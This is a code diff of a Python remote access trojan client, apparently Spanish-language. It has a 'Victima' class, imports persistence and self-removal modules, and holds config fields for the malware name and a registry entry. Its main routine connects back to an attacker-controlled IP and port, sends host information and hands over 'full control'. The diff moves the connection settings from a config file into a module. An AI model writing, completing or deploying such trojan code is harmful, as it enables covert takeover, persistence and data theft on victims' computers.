@@ -13,21 +13,22 @@ import platform
 import datetime
 import threading
 import subprocess
-import configparser
+#import configparser
 #import pyscreenshot
 import urllib.request
 from getpass import getuser
 
-
 # MODULOS DE OPERACIONES
 
-import netcat 
-import modulos.persistencia as persistencia
-import modulos.autoremover as autoremover
+from core.config import IP,PORT
+import core.modulos.persistencia as persistencia
+import core.modulos.autoremover as autoremover
 
 
 # PROGRAMA PRINCIPAL
 
+
+# VERIFICAR LA PLATAFORMA
 plataforma = sys.platform
 
 if plataforma.startswith('win'):
@@ -44,9 +45,9 @@ else:
 
 class Victima(object):
 
-	# -------- CONFIGURACION DEL SERVIDOR --------
+	# -------- CONFIGURACION DEL CLIENTE --------
 
-	def __init__(self, ip, port):
+	def __init__(self,ip,port):
 
 		super(Victima, self).__init__()
 		self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -469,24 +470,15 @@ class Victima(object):
 
 
 
-def main(configuraciones):
+def main():
 
-	s = Victima(configuraciones[0][0],configuraciones[0][1])	
+	# configuraciones[0][0],configuraciones[0][1]
+	# configuraciones[1][0],configuraciones[1][1],configuraciones[1][2]
+
+	s = Victima(IP,PORT)	
 	s.iniciar()
 	s.enviar_informacion()
 	s.control_total()
 
 if __name__ == '__main__':
-	
-	configuracion = configparser.ConfigParser()
-	configuracion.read("client.conf")
-
-	seccionConectar = configuracion["CONECTAR"]
-	seccionPersistencia = configuracion["PERSISTENCIA"]
-	
-	conectar = [seccionConectar["Servidor"],seccionConectar["Puerto"]]
-	persistencia = [seccionPersistencia["NombreBicho"],seccionPersistencia["NombreRegistro"],seccionPersistencia["RutaDestino"]]
-
-	configuraciones = [conectar,persistencia]
-
-	main(configuraciones)
+	main()
